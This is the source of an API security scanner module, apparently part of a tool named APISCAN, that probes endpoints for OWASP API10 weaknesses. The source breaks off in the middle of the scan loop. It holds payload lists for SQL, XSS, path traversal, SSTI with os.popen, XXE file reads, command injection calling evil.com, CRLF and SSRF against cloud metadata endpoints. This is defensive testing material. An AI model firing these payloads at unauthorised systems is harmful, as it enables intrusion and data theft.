##################################
# APISCAN - API Security Scanner #
# Licensed under the MIT License #
# Author: Perry Mertens, 2025    #
##################################
"""safe_consumption_audit.py - Enhanced OWASP API10:2023 Auditor
=================================================
Enhanced version with:
* Comprehensive injection payloads (SQL, XSS, Path, NoSQL, SSTI, LDAP, XXE)
* CRLF / Header Injection tests
* HTTP Parameter Pollution (HPP)
* SSRF Vector tests
* Docker Remote API exposure tests
* Kubernetes API exposure tests
* GraphQL Introspection tests
* Rate limiting and whitelist support
* Improved error handling
* INFO logging for progress tracking
"""
from __future__ import annotations
import json
import sys
import ssl
import os 
import socket
import urllib3
import urllib.parse as urlparse
import re
import time
import threading
stop_requested = threading.Event()
from concurrent.futures import ThreadPoolExecutor, as_completed
import requests
import logging 
import concurrent.futures

from collections import defaultdict
from datetime import datetime
from pathlib import Path
from typing import Any, Dict, List, Optional, Set, Tuple, Callable
from tqdm import tqdm
from functools import partial
from report_utils import ReportGenerator

from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

# Configure session with retries
session = requests.Session()
retries = Retry(total=3, backoff_factor=1, status_forcelist=[500, 502, 503])
session.mount("http://", HTTPAdapter(max_retries=retries))
session.mount("https://", HTTPAdapter(max_retries=retries))

logging.getLogger("urllib3").setLevel(logging.CRITICAL)
Issue = Dict[str, Any]

# ---- color fallback ----
try:
    from colorama import Fore, Style
except ModuleNotFoundError:
    class _No:
        CYAN = GREEN = YELLOW = MAGENTA = RED = RESET_ALL = ""
    Fore = Style = _No()
# -----------------------------------

def listen_for_quit():
    print("Enter 'Q' to stop scanning...")
    while True:
        inp = sys.stdin.readline().strip().lower()
        if inp == 'q':
            stop_requested.set()
            print("\n[!] Stop requested - please wait for current tasks to complete.\n")
            break

listener_thread = threading.Thread(target=listen_for_quit, daemon=True)
listener_thread.start()

class SafeConsumptionAuditor:
    def __init__(
        self,
        base_url: str,
        session: Optional[requests.Session] = None,
        *,
        timeout: int = 8,
        rate_limit: float = 0.5,
        log_monitor: Optional[Callable[[dict[str, Any]], None]] = None,
    ) -> None:
        """
        Parameters
        ----------
        base_url     : Basis-URL van het doel (https://example.com).
        session      : (Optioneel) vooraf geconfigureerde requests.Session.
        timeout      : Per-request timeout in seconden (default: 8).
        rate_limit   : Min. aantal seconden tussen requests naar één host.
        log_monitor  : Callback die elke log-entry ontvangt (bijv. voor live
                       reporting of unit-tests). Signature:  Callable[[dict], None]
        """

        # --- basisconfig ----------------------------------------------------
        self.base_url: str = base_url.rstrip("/")
        self.session: requests.Session = session or self._create_secure_session()
        self.timeout: int = timeout
        self.rate_limit: float = rate_limit
        self.log_monitor: Optional[
            Callable[[dict[str, Any]], None]
        ] = log_monitor  # live feed

        # --- thread-safe logging -------------------------------------------
        self.issues: List[Dict[str, Any]] = []
        self.issues_lock = threading.Lock()

        # Per-domein locks om parallel scans te beperken (ratelimiting)
        self.domain_ratelimits: defaultdict[str, threading.Lock] = defaultdict(
            threading.Lock
        )

        # Handig als je sub-scanners / plugins wilt bijhouden
        self._plugins: list[Any] = []

        print(
            f"[INIT] Auditor ready for {self.base_url} "
            f"(timeout={self.timeout}s, rate_limit={self.rate_limit}s)"
        )

    @staticmethod
    def _safe_body(data: Any) -> str:
        """Body naar leesbare tekst F vang binaire data af."""
        if data is None:
            return ""
        if isinstance(data, bytes):
            try:
                return data.decode("utf-8", "replace")
            except Exception:
                return f"<<{len(data)} bytes>>"
        return str(data)


    def _log(
        self,
        issue: str,
        target: str,
        severity: str,
        *,
        payload: Optional[str] = None,
        response: Optional[requests.Response] = None,
        extra: Optional[dict[str, Any]] = None,
    ) -> None:
        """Thread-safe log voor het HTML-rapport."""
        entry: dict[str, Any] = {
            "issue": issue,
            "target": target,
            "severity": severity,
            "timestamp": datetime.utcnow().isoformat(timespec="seconds") + "Z",
        }
        if payload:
            entry["payload"] = payload
        if extra:
            entry.update(extra)

        # -------- universele fall-backs --------
        entry.setdefault("description", issue)
        entry.setdefault("method", "GET")
        entry.setdefault("url", target)
        entry.setdefault("status_code", response.status_code if response else "-")
        entry.setdefault("endpoint", entry.get("url", target))   # nieuw

        # -------- details wanneer er wél een response is --------
        if response is not None:
            req = response.request
            entry.update(
                method=req.method,
                url=req.url,
                path=urlparse.urlparse(req.url).path or "/",   
                endpoint=urlparse.urlparse(req.url).path or "/",   
                status_code=response.status_code,
                request_headers=dict(req.headers),
                response_headers=dict(response.headers),
                request_body=self._safe_body(req.body),        
                response_body=response.text,
                elapsed_ms=response.elapsed.total_seconds() * 1000,
            )

        # thread-safe append
        with self.issues_lock:
            self.issues.append(entry)

        # console feedback
        print(f"[{severity}] {issue} @ {entry['url']}")

    def _filter_issues(self):
        cleaned, seen = [], set()
        for i in self.issues:
            code = int(i.get("status_code") or 0)

            # scanner-errors
            if code == 0:
                continue

            # dedupe
            key = (i["method"], i["path"], code, i.get("payload"))
            if key in seen:
                continue
            seen.add(key)

            # 405 / 403 => Info
            if code in (403, 405):
                i["severity"] = "Info"

            cleaned.append(i)
        self.issues = cleaned

    def _dedupe_issues(self) -> None:
        """
        Houd slechts één finding per uniek (method, path, status_code, severity).
        Tel hoe vaak hetzelfde voorkwam en plak dat aantal in 'duplicates'.
        """
        seen: dict[tuple, dict] = {}          # key → eerste finding
        for f in self.issues:
            key = (f.get("method"),
                f.get("path"),              # pad is al zonder host
                f.get("status_code"),
                f.get("severity"))
            if key in seen:
                seen[key]["duplicates"] += 1
            else:
                f["duplicates"] = 0           # eerste keer
                seen[key] = f
        self.issues = list(seen.values())

        
    def _dump_raw_issues(self, log_dir: Path) -> Path:
        """
        Schrijft self.issues on-gefilterd weg in log_dir
        en geeft het pad terug.
        """
        import json, datetime

        log_dir.mkdir(parents=True, exist_ok=True)
        ts   = datetime.datetime.utcnow().isoformat(timespec="seconds").replace(":", "-")
        path = log_dir / f"unsafe_raw_{ts}.json"

        with path.open("w", encoding="utf-8") as fh:
            json.dump(self.issues, fh, indent=2, ensure_ascii=False)

        print(f"[LOG] Volledig issue-log weggeschreven naar {path}")
        return path
    
    """Security auditor for OWASP API10 with comprehensive tests and INFO-logging"""
    INJECTION_PAYLOADS = {
        'sql': [
            "' OR '1'='1",
            "' OR 1=1--",
            "'; DROP TABLE users--",
            "' UNION SELECT null--",
            "' AND SLEEP(5)--",
            "'||(SELECT version())||'",
            '" OR "" = ""',
            "' OR 'a'='a"
        ],   
        'xss': [
            '<script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            '<svg/onload=alert(1)>',
            '<body onload=alert(1)>',
            '"><script>alert(document.domain)</script>',
            "'><iframe src=\"javascript:alert(1)\"></iframe>",
            '<math><mi//xlink:href="javascript:alert(1)">'
        ],
        'path': [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\win.ini",
            "/../../../../boot.ini",
            "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
            "..%2f..%2f..%2fetc%2fshadow",
            "/etc/passwd%00",
            "%252e%252e/%252e%252e/%252e%252e/etc/passwd",
            "%252e%252e%252fetc%252fpasswd",
            "..%c0%af..%c0%afetc/passwd",
            "..%e0%80%afetc/passwd",
            "..%c1%9c..%c1%9cetc/passwd",
            "..%uff0e%uff0e%u2215etc%u2215passwd",
            "..\\..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "..\\\\..\\\\etc\\\\passwd",
            "..//..//..//etc//passwd",
            "/etc/passwd%00.png",
            "..%2f..%2f%2e%2e%2fetc%2fpasswd",
            "../../etc/passwd%00.jpg",
            "../../etc/passwd..;/",
        ],    
        'nosql': [
            '{"username": {"$ne": null}, "password": {"$ne": null}}', 
            '{"$or": [{"admin": true}, {}]}',
            '{"$where": "sleep(5000)"}', 
            '{"username": {"$regex": ".*"}}', 
            '{"$and": [{"a": {"$gt": ""}}, {"b": {"$lt": ""}}]}'
        ],
        'ssti': [
            "{{7*7}}", "${{7*7}}", "<%= 7*7 %>", "{{config}}", 
            "{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}",
            "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}"
        ],
        'ldap': [
            "*)(&(userPassword=*))", "(&(objectClass=*)(uid=*))", "*)%00", "*)(cn=*))(|(cn=*", "*))(|"
        ],
        'xxe': [
            "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>",
            "<!DOCTYPE data [<!ENTITY file SYSTEM 'file:///etc/hosts'>]><data>&file;</data>",
            "<?xml version='1.0'?><!DOCTYPE root [<!ENTITY % ext SYSTEM 'http://evil.com/ext.dtd'> %ext;]>"
        ],
        'cmdi': [
            ";whoami", "|id", "&nslookup test", "`id`", "$(id)", "|| ping -c 1 evil.com", "&& curl http://evil.com"
        ],
        'jsonp': [
            "callback=alert", "callback=console.log", "jsonp=alert", "cb=alert", "callbackName=alert"
        ]
    }    
    CRLF_PAYLOADS = [
        '%0d%0aX-Evil: injected',          '%0a%0dSet-Cookie: pwned=true',
        '\r\nX-Injected-Header: crlf',     '\r\nSet-Cookie: session=abc123',
        '%0d%0aLocation: https://evil.com', '%0d%0aContent-Length: 0',
        '%0d%0aContent-Type: text/html',   '%0d%0aRefresh: 0; url=https://evil.com',
        '%0d%0aLink: </malicious>; rel=preload', '%0d%0aX-Frame-Options: DENY',
        '%0d%0aX-XSS-Protection: 0',       '%0d%0aAccess-Control-Allow-Origin: *',
        '%0d%0aVary: Origin',              '%0d%0aSet-Cookie: __Host-pwned=1; Path=/; Secure; HttpOnly',
        '%0d%0aConnection: close',
    ]
    HPP_PARAMS = [
        'id', 'q', 'search', 'filter', 'sort', 'order', 'page', 'offset', 'limit',
        'username', 'user', 'email', 'token', 'session', 'auth', 'access', 'role',
        'callback', 'lang', 'debug', 'redirect', 'ref', 'category', 'tag', 'type',
        'status', 'id[]', 'name', 'fields', 'expand', 'include', 'exclude'
    ]

    SSRF_PAYLOADS = [
        "http://169.254.169.254/latest/meta-data/",         "http://169.254.169.254/metadata/instance",
        "http://169.254.169.254/computeMetadata/v1/",       "http://100.100.100.200/latest/meta-data/",
        "http://metadata.google.internal/computeMetadata/",
        "file:///etc/passwd", "file:///c:/windows/win.ini",
        "file:///proc/self/environ", "file:///sys/class/net/eth0/address",
        "gopher://127.0.0.1:6379/_PING", "gopher://127.0.0.1:11211/",
        "gopher://127.0.0.1:80/_GET / HTTP/1.0",
        "http://localhost", "http://127.0.0.1", "http://[::1]",
        "http://0.0.0.0", "http://2130706433",
        "http://example.com@127.0.0.1", "http://127.0.0.1.nip.io",
        "http://127.0.0.1.xip.io", "http://attacker.com/ssrf/test",
        "http://burpcollaborator.net", "http://requestbin.net/r/abc123",
        "http://127.0.0.1:80", "http://localhost:8000",
        "http://localhost:2375/version", "http://localhost:10250/pods",
        "http://localhost:5984/_all_dbs",
    ]

        # -------------------  False-positive filters / error keys  -------------------
    NOSQL_ERROR_KEYWORDS = [
         "mongodb",
        "mongo",
        "bson",
        "e11000 duplicate key",
        "json parse error",
        "unexpected token", 
        "unrecognized pipeline stage",
        "no documents in result",
        "bsonobj size must be smaller",
        "e11000 duplicate key error",
        "mongo: no documents in result",
        "unrecognized pipeline stage",
        "cannot apply \$inc to a value of non-numeric type",
        "fieldpath field names may not contain",
        "unexpected token",
        "mongo: no documents in result"
        "mongonetworkerror",
        "connection timed out",
        "command failed with error",
        "unauthorized",
        "type mismatch: expected .+ but found",
        "failed to parse",
        "invalid bson field name",
        "invalid operator",
    ]

    SQL_ERROR_KEYWORDS = [
        "sql syntax", "syntax error at or near", "mysql", "postgres",
        "oracle", "mariadb", "unclosed quotation mark",
        "invalid input syntax for type", "query failed",
    ]

    SQL_ERROR_REGEX = [
        r"column \".+?\" does not exist",
        r"relation \".+?\" does not exist",
        r"duplicate key value",
        r"operator does not exist:",
    ]

    GRAPHQL_INTROSPECTION_QUERY = """
    query IntrospectionQuery {
    __schema {
        queryType { name }
        mutationType { name }
        subscriptionType { name }
        types {
        ...FullType
        }
        directives {
        name
        description
        locations
        args {
            ...InputValue
        }
        }
    }
    }

    fragment FullType on __Type {
    kind
    name
    description
    fields(includeDeprecated: true) {
        name
        description
        args {
        ...InputValue
        }
        type {
        ...TypeRef
        }
        isDeprecated
        deprecationReason
    }
    inputFields {
        ...InputValue
    }
    interfaces {
        ...TypeRef
    }
    enumValues(includeDeprecated: true) {
        name
        description
        isDeprecated
        deprecationReason
    }
    possibleTypes {
        ...TypeRef
    }
    }

    fragment InputValue on __InputValue {
    name
    description
    type { ...TypeRef }
    defaultValue
    }

    fragment TypeRef on __Type {
    kind
    name
    ofType {
        kind
        name
        ofType {
        kind
        name
        }
    }
    }
    """
    
    

    @staticmethod
    def third_party_hosts_from_swagger(swagger_path: str) -> List[str]:
        spec = json.loads(Path(swagger_path).read_text(encoding='utf-8'))
        hosts: Set[str] = set()
        for srv in spec.get('servers', []):
            url = srv.get('url')
            if url:
                parsed = urlparse.urlparse(url)
                if parsed.netloc:
                    hosts.add(parsed.netloc.split(':')[0])
        def walk(node: Any):
            if isinstance(node, dict):
                for k, v in node.items():
                    if k == '$ref' and isinstance(v, str) and v.startswith('http'):
                        hosts.add(urlparse.urlparse(v).netloc.split(':')[0])
                    walk(v)
            elif isinstance(node, list):
                for item in node:
                    walk(item)
        walk(spec)
        return sorted(hosts)

    @staticmethod
    def endpoints_from_swagger(swagger_path: str) -> List[str]:
        spec = json.loads(Path(swagger_path).read_text(encoding='utf-8'))
        servers = [srv.get('url').rstrip('/') for srv in spec.get('servers', []) if srv.get('url')]
        paths = spec.get('paths', {})
        endpoints: List[str] = []
        for server in servers:
            for path in paths:
                endpoints.append(server + path)
        return endpoints
    
    def _is_payload_reflected(self, finding: dict) -> bool:
        """Kijk of de payload merkbaar terugkomt in de response."""
        payload = finding.get("payload") or ""
        body    = (finding.get("response_body") or "").lower()
        return payload.lower() in body
    


# ---------------------------------------------------------------------
# 1.  INJECTION TEST
# ---------------------------------------------------------------------
    def _test_injection(
        self,
        test_url: str,
        attack_type: str,
        *,
        method: str = "auto",
        payload: str | None = None,
    ) -> None:
        """
        Voert één injectietest uit tegen `test_url`.
        - Ondersteunt sql, nosql, xss, ssti, ssrf, ldap, xxe (via attack_type).
        - Injecteert zowel in query-string als in path-parameter.
        - Kies HTTP-methode automatisch of forceer met `method=`.

        Logt een Critical-finding wanneer `_is_injection_successful()` True teruggeeft.
        """
        # -------- early exit ------------------------------------------------
        if stop_requested.is_set():
            return

        # -------- standaard payloads ----------------------------------------
        default_payloads = {
            "sql":  "1 OR 1=1--",
            "nosql": '{"$ne": null}',
            "xss":  '<script>alert(1)</script>',
            "ssti": "{{7*7}}",
            "ssrf": "http://169.254.169.254/",
            "ldap": "*)(uid=*))(|(uid=*",
            "xxe":  "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
        }
        payload = payload or default_payloads.get(attack_type, "1")

        parsed = urlparse.urlparse(test_url)
        domain = parsed.netloc

        try:
            # ---------- rate-limit guard ------------------------------------
            with self.domain_ratelimits[domain]:
                time.sleep(self.rate_limit)

                # ---------- methode bepalen ---------------------------------
                final_method = (
                    "POST"
                    if method == "auto" and parsed.path.rstrip("/").endswith("posts")
                    else method if method != "auto"
                    else "GET"
                )

                # ---------- request bouwen ----------------------------------
                if final_method == "GET":
                    # • vervang placeholder {id} of eerste cijfer in path
                    attack_url = re.sub(
                        r'(%7B\w+?Id%7D|\d+)',
                        urlparse.quote_plus(payload),
                        test_url,
                        count=1,
                        flags=re.I  
                    )
                    response = self.session.get(
                        attack_url, timeout=self.timeout / 2, allow_redirects=False
                    )
                    requested_url = attack_url

                else:  # POST
                    base_url = test_url.split("?", 1)[0]        # query-string weg
                    response = self.session.post(
                        base_url,
                        data={"input": payload},
                        timeout=self.timeout / 2,
                        allow_redirects=False,
                    )
                    requested_url = (
                        base_url + "?input=" + urlparse.quote_plus(payload)
                    )

                # ---------- evalueren & loggen ------------------------------
                if self._is_injection_successful(response, attack_type):
                    self._log(
                        f"Possible {attack_type.upper()} injection",
                        requested_url,
                        "Critical",
                        payload=payload,
                        response=response,
                    )

                # ---------- extra server-log analyse ------------------------
                self._detect_server_errors(requested_url)

        except Exception as exc:
            self._log(
                "Injection test failed",
                test_url,
                "Low",
                extra={"error": str(exc), "type": attack_type},
            )


# ---------------------------------------------------------------------
# 2.  SUCCESS-DETECTOR
# ---------------------------------------------------------------------
    def _is_injection_successful(
        self,
        response: requests.Response,
        attack_type: str,
        *,
        baseline_latency: float = 0.5,
    ) -> bool:
        """
        Geeft *True* terug wanneer er redelijke aanwijzingen zijn dat een injectie
        is gelukt:
        • HTTP-500 met SQL/NoSQL/SSTI-keywords
        • 4xx met specifieke foutpatronen
        • gereflecteerde payload
        • time-delay (blind SQL)
        """
        content = response.text.lower()
        status  = response.status_code

        # ---------- algemene 5xx-indicatie ---------------------------------
        if status >= 500:
            return attack_type in {"sql", "nosql", "ssti", "ldap", "xxe"}

        # ---------- SQL-injectie ------------------------------------------
        if attack_type == "sql":
            indicators = [
                "sql", "syntax", "mysql", "postgres", "oracle", "mariadb",
                "query failed", "invalid input syntax for type",
                "syntax error at or near",
                "duplicate key value", "relation \"",
                "column \"", "operator does not exist",
                "permission denied for relation",
                "syntax", "unclosed", "database", "query failed",
                "rows in result set", "invalid input syntax for type",
                "syntax error at or near", "column", "does not exist", "duplicate key",
                "division by zero", "relation" , "does not exist", "operator does not exist"
                "permission denied for relation","cannot insert null into","violates not-null constraint",
                "data type","entry for table","single column"
            ]
            regexes = [
                    r'column ".*?" does not exist',
                    r'relation ".*?" does not exist',
                    r'operator does not exist:.*?=.*?',
                    r'permission denied for relation .*?',
                    r'cannot insert null into.*?',
                    r'violates .*? constraint'
            ]
            # 4xx-fouttekst met SQL-keywords
            if status in {400, 422} and any(k in content for k in indicators):
                return True

            if any(k in content for k in indicators):
                return True

            if any(re.search(rgx, content) for rgx in regexes):
                return True

            # time-based blind
            if response.elapsed and response.elapsed.total_seconds() > baseline_latency * 3:
                return True

            return False

        # ---------- NoSQL-injectie ----------------------------------------
        if attack_type == "nosql":
            nosql_keys = [
                "mongodb",
                "mongo",
                "bson",
                "e11000 duplicate key",
                "json parse error",
                "unexpected token", 
                "unrecognized pipeline stage",
                "no documents in result",
                "bsonobj size must be smaller",
                "e11000 duplicate key error",
                "mongo: no documents in result",
                "unrecognized pipeline stage",
                "cannot apply inc to a value of non-numeric type",
                "fieldpath field names may not contain",
                "unexpected token",
                "mongo: no documents in result"
                "mongonetworkerror",
                "connection timed out",
                "command failed with error",
                "unauthorized",
                "type mismatch: expected .+ but found",
                "failed to parse",
                "invalid bson field name",
                "invalid operator",
            ]
            return any(k in content for k in nosql_keys)

        # ---------- XSS ----------------------------------------------------
        if attack_type == "xss":
            return any(x in content for x in ("<script>", "alert(", "onerror="))

        # ---------- SSTI ---------------------------------------------------
        if attack_type == "ssti":
            return any(x in content for x in ("{{", "}}", "<%", "%>", "${"))

        # ---------- SSRF ---------------------------------------------------
        if attack_type == "ssrf":
            ssrf_keys = [
                "connection refused", "dns error", "invalid url",
                "bad gateway", "connection timed out",
            ]
            return status in {502, 504} or any(k in content for k in ssrf_keys)

        # ---------- LDAP ---------------------------------------------------
        if attack_type == "ldap":
            return any(k in content for k in ("ldap", "invalid dn", "bind failed"))

        # ---------- XXE ----------------------------------------------------
        if attack_type == "xxe":
            return any(k in content for k in ("doctype", "entity", "xml parsing error"))

        return False

            
        
    def _detect_server_errors(self, endpoint: str):
        """Controleer server logs voor fouten na request"""
        if self.log_monitor:
            errors = self.log_monitor()
            for error in errors:
                if 'sql' in error.lower() and endpoint in error:
                    self._log(
                        'SQL error detected in server logs',
                        endpoint,
                        'High',
                        extra={'error': error}
                    )
        
    def _test_basic_security(self, endpoint: str) -> None:
        if stop_requested.is_set():
            return
        try:
            r = self.session.get(endpoint, timeout=self.timeout/2, allow_redirects=False)

            if r.status_code >= 400:
                body = r.text.lower()

                # ---   SQL-indicator? ------------------------------------
                if any(k in body for k in self.SQL_ERROR_KEYWORDS) or \
                any(re.search(p, body) for p in self.SQL_ERROR_REGEX):
                    self._log(
                        "Possible SQL injection",
                        endpoint,
                        "Critical",
                        response=r
                    )

                # ---   NoSQL-indicator? ----------------------------------
                elif any(k in body for k in self.NOSQL_ERROR_KEYWORDS):
                    self._log(
                        "Possible NOSQL injection",
                        endpoint,
                        "Critical",
                        response=r
                    )

                # ---   anders ‘gewone’ 4xx/5xx ---------------------------
                else:
                    self._log(
                        "Basic security fail",
                        endpoint,
                        "Medium",
                        response=r
                    )

        except Exception as exc:
            self._log("Basic security test failed", endpoint, "Low",
                    extra={"error": str(exc)})

    
    
    def _test_crlf_injection(self, endpoint: str):
        """CRLF-injectietests met rate-limiting"""
        if stop_requested.is_set():
            return
        try:
            domain = urlparse.urlparse(endpoint).netloc

            for payload in self.CRLF_PAYLOADS:
                if stop_requested.is_set():
                    break  # netjes stoppen bij Q-verzoek

                try:
                    # Apply rate limiting
                    with self.domain_ratelimits[domain]:
                        time.sleep(self.rate_limit)

                        url = f"{endpoint}?q={payload}"
                        r = self.session.get(url, timeout=self.timeout)

                        # Detectie-logica
                        if "evil" in r.text.lower() or "injected" in r.text.lower():
                            self._log(
                                "CRLF Injection",
                                url,
                                "High",
                                payload=payload,
                                response=r,          # ← GEEN response_sample meer
                            )

                except Exception as e:
                    self._log(
                        "CRLF test failed",
                        url,                     # gebruik de echte test-URL voor context
                        "Medium",
                        extra={"error": str(e), "payload": payload},
                    )

        except Exception as e:
            self._log(
                "CRLF test setup failed",
                endpoint,
                "Medium",
                extra={"error": str(e)},
            )


    
    def _test_ssrf(self, endpoint: str):
        """SSRF tests with proper host extraction"""
        if stop_requested.is_set():
            return
        try:
            host = urlparse.urlparse(endpoint).hostname
            if not host:
                self._log('SSRF test invalid host', endpoint, 'Low')
                return
            if host in ["localhost", "127.0.0.1", "::1"]:
                return  # Skip localhost targets
                
            print(f"[INFO] SSRF tests for {host}")

            for payload in self.SSRF_PAYLOADS:
                if stop_requested.is_set():
                    break

                try:
                    # Vervang localhost/127.0.0.1 door het doelhost
                    test_url = payload.replace("localhost", host).replace("127.0.0.1", host)
                    
                    # Rate limiting
                    domain = urlparse.urlparse(test_url).netloc
                    with self.domain_ratelimits[domain]:
                        time.sleep(self.rate_limit)

                        r = self.session.get(test_url, timeout=self.timeout)
                        
                        # Als endpoint bereikbaar, log dan met volledige response
                        if r.status_code < 400:
                            self._log(
                                'SSRF endpoint accessible',
                                test_url,
                                'High',
                                response=r
                            )

                except requests.exceptions.ConnectionError as e:
                    # Specifieke afhandeling voor onbereikbare hosts
                    if "10051" in str(e) or "10061" in str(e):
                        pass  # Negeer onbereikbare hosts
                    else:
                        self._log(
                            'SSRF test failed',
                            test_url,
                            'Medium',
                            extra={'error': str(e)}
                        )
                except Exception as e:
                    self._log(
                        'SSRF test failed',
                        test_url,
                        'Medium',
                        extra={'error': str(e)}
                    )

        except Exception as e:
            self._log(
                'SSRF test setup failed',
                endpoint,
                'Medium',
                extra={'error': str(e)}
            )
        
    def _test_graphql_introspection(self, endpoint: str):
        if stop_requested.is_set():
            return
        try:
            domain = urlparse.urlparse(endpoint).netloc
            with self.domain_ratelimits[domain]:
                time.sleep(self.rate_limit)
                
                # Probeer GraphQL endpoint
                for path in ["/graphql", "/v1/graphql", "/api/graphql"]:
                    url = f"{endpoint.rstrip('/')}{path}"
                    try:
                        r = self.session.post(
                            url,
                            json={"query": self.GRAPHQL_INTROSPECTION_QUERY},
                            timeout=self.timeout
                        )
                        if r.status_code == 200 and "__schema" in r.text:
                            self._log(
                                'GraphQL introspection enabled',
                                endpoint,
                                'Medium',
                                response=r
                            )
                            break
                    except Exception:
                        continue
        except Exception as e:
            self._log(
                'GraphQL test failed',
                endpoint,
                'Low',
                extra={'error': str(e)}
            )
    
    def _test_hpp(self, endpoint: str) -> None:
        """
        HTTP Parameter Pollution-test:
        - Voegt voor elk param twee keer dezelfde key toe (?q=1&q=2).
        - Logt alleen Medium als de server 2xx teruggeeft en '1,2' ergens
        in de body voorkomt.  Anders wordt het Info.
        """
        if stop_requested.is_set():
            return

        try:
            domain = urlparse.urlparse(endpoint).netloc

            for param in self.HPP_PARAMS:
                # bouw URL buiten try zodat url altijd bestaat
                url = f"{endpoint}?{param}=1&{param}=2"

                try:
                    # rate-limit per domain
                    with self.domain_ratelimits[domain]:
                        time.sleep(self.rate_limit)

                        r = self.session.get(
                            url, timeout=self.timeout / 2, allow_redirects=False
                        )

                        body_has_combo = "1,2" in r.text or ",1" in r.text

                        # bepaal severity
                        severity = (
                            "Medium"
                            if (r.status_code < 300 and body_has_combo)
                            else "Info"
                        )

                        # log altijd, maar Info wordt later niet in console geprint
                        self._log(
                            "HPP detected",
                            url,
                            severity,
                            response=r,
                            extra={"parameter": param},
                        )

                except Exception as e:
                    # netwerk/time-out etc. → Low
                    self._log(
                        "HPP test failed",
                        url,
                        "Low",
                        extra={"error": str(e)},
                    )

        except Exception as e:
            self._log(
                "HPP test setup failed",
                endpoint,
                "Low",
                extra={"error": str(e)},
            )

    
    
    def _test_docker_api(self, endpoint: str):
        """Docker API test with proper host extraction"""
        if stop_requested.is_set():
            return
        try:
            host = urlparse.urlparse(endpoint).hostname
            if not host:
                self._log('Docker test invalid host', endpoint, 'Low')
                return

            print(f"[INFO] Docker API test for {host}")

            try:
                # Apply rate limiting
                with self.domain_ratelimits[host]:
                    time.sleep(self.rate_limit)

                    r = self.session.get(f"http://{host}:2375/version", timeout=self.timeout)
                    if r.status_code == 200:
                        self._log(
                            'Docker Remote API open',
                            f"http://{host}:2375/version",
                            'High',
                            response=r    # ← volledige Response meegeven
                        )
            except Exception as e:
                self._log(
                    'Docker test failed',
                    f"http://{host}:2375/version",
                    'Medium',
                    extra={'error': str(e)}
                )
        except Exception as e:
            self._log(
                'Docker test setup failed',
                endpoint,
                'Medium',
                extra={'error': str(e)}
            )


    def _test_kubernetes_api(self, endpoint: str):
        """Kubernetes API test with proper host extraction"""
        if stop_requested.is_set():
            return
        try:
            host = urlparse.urlparse(endpoint).hostname
            if not host:
                self._log('Kubernetes test invalid host', endpoint, 'Low')
                return

            print(f"[INFO] Kubernetes API test for {host}")

            for port in [6443, 2379]:
                if stop_requested.is_set():
                    break

                try:
                    # Apply rate limiting
                    with self.domain_ratelimits[host]:
                        time.sleep(self.rate_limit)

                        url = f"https://{host}:{port}/version"
                        r = self.session.get(url, timeout=self.timeout, verify=False)
                        if r.status_code == 200:
                            self._log(
                                'Kubernetes API open',
                                url,
                                'High',
                                response=r    # ← volledige Response meegeven
                            )
                except Exception as e:
                    self._log(
                        'Kubernetes test failed',
                        endpoint,
                        'Medium',
                        extra={'error': str(e)}
                    )

        except Exception as e:
            self._log(
                'Kubernetes test setup failed',
                endpoint,
                'Medium',
                extra={'error': str(e)}
            )


    

    def _test_sensitive_data_exposure(self, endpoint: str):
        """Sensitive data exposure test"""
        if stop_requested.is_set():
            return
        try:
            domain = urlparse.urlparse(endpoint).netloc
            with self.domain_ratelimits[domain]:
                time.sleep(self.rate_limit)

                # CORRECTIE: Gebruik correcte URL-constructie
                url = f"{self.base_url}/api/v1/config" if endpoint == self.base_url else f"{endpoint}/api/v1/config"
                
                r = self.session.get(url, timeout=self.timeout)
                content = r.text.lower()
                for term in ['password', 'secret', 'token', 'key', 'credential']:
                    if term in content:
                        self._log(
                            'Sensitive data exposure',
                            url,
                            'High',
                            response=r
                        )
                        break
        except Exception as e:
            # CORRECTIE: Log status_code 0 bij errors
            self._log(
                'Sensitive data test failed',
                endpoint,
                'Medium',
                extra={'error': str(e), 'status_code': 0}
            )


    def test_endpoints(self, endpoints: List[str]) -> List[Issue]:
        MAX_WORKERS = min(32, (os.cpu_count() or 1) * 4)
        print(f"{Fore.CYAN}[INFO] Starting full scan with {MAX_WORKERS} workers{Style.RESET_ALL}")

        # Reset stop event bij nieuwe scan
        global stop_requested
        stop_requested.clear()

        # Pre-scan: quick reachability check
        reachable_endpoints = []
        with tqdm(total=len(endpoints), desc="Pre-scanning") as pbar:
            with ThreadPoolExecutor(max_workers=MAX_WORKERS) as pre_executor:
                future_to_ep = {
                    pre_executor.submit(self._is_endpoint_reachable, ep): ep
                    for ep in endpoints
                }
                
                for future in as_completed(future_to_ep):
                    if stop_requested.is_set():
                        print(f"{Fore.YELLOW}[!] Scan stopped by user during pre-scan{Style.RESET_ALL}")
                        # Annuleer alle lopende taken
                        for f in future_to_ep:
                            f.cancel()
                        break
                        
                    ep = future_to_ep[future]
                    try:
                        if future.result(timeout=self.timeout * 2):
                            reachable_endpoints.append(ep)
                    except Exception as e:
                        self._log(f"Pre-scan failed for {ep}", str(e), "Low")
                    finally:
                        pbar.update(1)

        if stop_requested.is_set():
            return self.issues

        # Calculate total tasks (1 per test per endpoint)
        num_tests_per_endpoint = 8 + len(self.INJECTION_PAYLOADS)
        total_tasks = len(reachable_endpoints) * num_tests_per_endpoint
        
        # Main scan: full tests
        with tqdm(total=total_tasks, desc="Scanning endpoints") as pbar:
            with ThreadPoolExecutor(max_workers=MAX_WORKERS) as main_executor:
                all_tasks = []
                
                for ep in reachable_endpoints:
                    if stop_requested.is_set():
                        break
                    
                    # Add all test types
                    test_fns = [
                        partial(self._test_basic_security, ep),
                        partial(self._test_crlf_injection, ep),
                        partial(self._test_hpp, ep),
                        partial(self._test_sensitive_data_exposure, ep),
                        partial(self._test_graphql_introspection, ep),
                        partial(self._test_ssrf, ep),
                        #partial(self._test_docker_api, ep),
                        #partial(self._test_kubernetes_api, ep),
                    ]
                    
                    # Add injection tests per type
                    for t in self.INJECTION_PAYLOADS:
                        test_fns.append(partial(
